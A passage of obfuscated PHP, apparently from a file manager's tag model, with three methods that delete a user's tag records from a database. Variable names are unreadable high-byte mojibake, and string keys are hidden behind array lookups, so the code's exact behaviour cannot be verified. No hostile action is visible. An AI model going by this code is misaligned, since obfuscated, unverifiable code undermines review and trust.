removeFromTag($bÁÀõ—àÎ†, $AâÎëì∂úÌ) { $C‹ﬂ¬ó◊É± =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!Model($C‹ﬂ¬ó◊É±[2212])->listData($AâÎëì∂úÌ) || !Model($C‹ﬂ¬ó◊É±[749])->pathInfo($bÁÀõ—àÎ†)) { return !1; } $aÌëÃåêê = array($C‹ﬂ¬ó◊É±[1340] => USER_ID, $C‹ﬂ¬ó◊É±[432] => $AâÎëì∂úÌ, $C‹ﬂ¬ó◊É±[385] => $C‹ﬂ¬ó◊É±[379], $C‹ﬂ¬ó◊É±[384] => $bÁÀõ—àÎ†); return $this->where($aÌëÃåêê)->delete(); } protected function removeByTag($bﬁÑ„¯©ÑÔ) { $C‹æÑò·æ« =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$bﬁÑ„¯©ÑÔ) { return !1; } $e‹Ÿ‡◊¿öﬁ = array($C‹æÑò·æ«[1340] => USER_ID, $C‹æÑò·æ«[432] => $bﬁÑ„¯©ÑÔ); return $this->where($e‹Ÿ‡◊¿öﬁ)->delete(); } protected function removeBySource($EÉÜ⁄µÕÒê) { $E±≥Ì»∆¬Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fç¶©≈®êõ = array($E±≥Ì»∆¬Œ[1340] => USER_ID, $E±≥Ì»∆¬Œ[384] => $EÉÜ⁄µÕÒê, $E±≥Ì»∆¬Œ[432] => array($E±≥Ì»∆¬Œ[926], 0)); return $this->where($fç¶©≈®êõ)->delete(); } }